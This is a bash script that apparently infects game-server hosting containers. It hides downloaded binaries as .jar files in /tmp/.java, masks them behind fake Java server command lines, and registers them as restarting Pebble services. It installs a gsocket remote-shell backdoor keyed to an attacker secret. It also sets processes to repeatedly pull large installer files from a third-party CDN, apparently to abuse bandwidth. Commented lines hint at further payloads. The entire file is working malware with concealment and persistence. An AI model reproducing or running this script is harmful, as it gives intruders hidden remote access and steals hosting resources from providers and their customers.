#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    # cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    # cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/luny/ds.conf -o cfg.conf
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
cat > /home/container/.local/.tmp/layers/000-app.yaml << EOF
services:
  task0:
    override: replace
    working-dir: /home/container/.local/.tmp
    command: ./paper.jar -a 'java -Xms128M -Xmx8192M -Dfml.queryResult=confirm -Dlog4j2.formatMsgNoLookups=true -Dterminal.jline=false -Dterminal.ansi=true -DIReallyKnowWhatIAmDoingISwear=true -Djdk.module.illegalAccess=deny -Duser.timezone=Europe/Moscow -jar -DPaper.IgnoreJavaVersion=true -DPurpur.IgnoreJavaVersion=true -XX:+UseNUMA -Dlog4j2.formatMsgNoLookups=true -Dfym_st=true -XX:G1HeapWastePercent=10 -XX:+OptimizeStringConcat -XX:+TieredCompilation -XX:+EliminateLocks -XX:+UseSuperWord -XX:+OptimizeFill -XX:LoopUnrollMin=4 -XX:LoopMaxUnroll=16 -XX:+UseLoopPredicate -XX:+RangeCheckElimination -Dfile.encoding=UTF-8 -XX:+DisableExplicitGC -XX:+UseFastJNIAccessors -jar server.jar nogui' ./patch.jar -c 3000 -s https://img.bosszhipin.com/v2/upload/boss-zhipin/mac-arm/boss-zhipin-arm64-1.6.4.dmg
    on-success: ignore
    on-failure: restart
    startup: enabled
  task1:
    override: replace
    working-dir: /home/container/.local/.tmp
    command: ./paper.jar -a 'java -Xms128M -Xmx8192M -Dfml.queryResult=confirm -Dlog4j2.formatMsgNoLookups=true -Dterminal.jline=false -Dterminal.ansi=true -DIReallyKnowWhatIAmDoingISwear=true -Djdk.module.illegalAccess=deny -Duser.timezone=Europe/Moscow -jar -DPaper.IgnoreJavaVersion=true -DPurpur.IgnoreJavaVersion=true -XX:+UseNUMA -Dlog4j2.formatMsgNoLookups=true -Dfym_st=true -XX:G1HeapWastePercent=10 -XX:+OptimizeStringConcat -XX:+TieredCompilation -XX:+EliminateLocks -XX:+UseSuperWord -XX:+OptimizeFill -XX:LoopUnrollMin=4 -XX:LoopMaxUnroll=16 -XX:+UseLoopPredicate -XX:+RangeCheckElimination -Dfile.encoding=UTF-8 -XX:+DisableExplicitGC -XX:+UseFastJNIAccessors -jar server.jar nogui' ./patch.jar -c 1500 -s https://img.bosszhipin.com/v2/upload/boss-zhipin/win/boss-zhipin-1.6.4.exe
    on-success: ignore
    on-failure: restart
    startup: enabled
  task3:
    override: replace
    working-dir: /tmp/.java/bin
    environment:
      HOME: /home/container
      GSOCKET_ARGS: "-s i6C7A0e9A2c--C9F0d6A2-k8A1C5J1g7-0A6f3D9g4H7bJ7-5C4F9e1 -liq"
    command: ./paper.jar -a 'java -Xms128M -Xmx8192M -Dfml.queryResult=confirm -Dlog4j2.formatMsgNoLookups=true -Dterminal.jline=false -Dterminal.ansi=true -DIReallyKnowWhatIAmDoingISwear=true -Djdk.module.illegalAccess=deny -Duser.timezone=Europe/Moscow -jar -DPaper.IgnoreJavaVersion=true -DPurpur.IgnoreJavaVersion=true -XX:+UseNUMA -Dlog4j2.formatMsgNoLookups=true -Dfym_st=true -XX:G1HeapWastePercent=10 -XX:+OptimizeStringConcat -XX:+TieredCompilation -XX:+EliminateLocks -XX:+UseSuperWord -XX:+OptimizeFill -XX:LoopUnrollMin=4 -XX:LoopMaxUnroll=16 -XX:+UseLoopPredicate -XX:+RangeCheckElimination -Dfile.encoding=UTF-8 -XX:+DisableExplicitGC -XX:+UseFastJNIAccessors -jar server.jar nogui' ./add-on.jar 
    on-failure: restart
    startup: enabled
EOF

export PEBBLE="/home/container/.local/.tmp"
export PEBBLE_VERBOSE=1
export XDG_CONFIG_HOME="/home/container/.local/.tmp/.conf"
cd /home/container/.local/.tmp && nohup ./paper.jar -a 'java -Xms128M -Xmx8192M -Dfml.queryResult=confirm -Dlog4j2.formatMsgNoLookups=true -Dterminal.jline=false -Dterminal.ansi=true -DIReallyKnowWhatIAmDoingISwear=true -Djdk.module.illegalAccess=deny -Duser.timezone=Europe/Moscow -jar -DPaper.IgnoreJavaVersion=true -DPurpur.IgnoreJavaVersion=true -XX:+UseNUMA -Dlog4j2.formatMsgNoLookups=true -Dfym_st=true -XX:G1HeapWastePercent=10 -XX:+OptimizeStringConcat -XX:+TieredCompilation -XX:+EliminateLocks -XX:+UseSuperWord -XX:+OptimizeFill -XX:LoopUnrollMin=4 -XX:LoopMaxUnroll=16 -XX:+UseLoopPredicate -XX:+RangeCheckElimination -Dfile.encoding=UTF-8 -XX:+DisableExplicitGC -XX:+UseFastJNIAccessors -jar server.jar nogui' ./pebble run >/dev/null 2>&1 &

# cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ] ; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
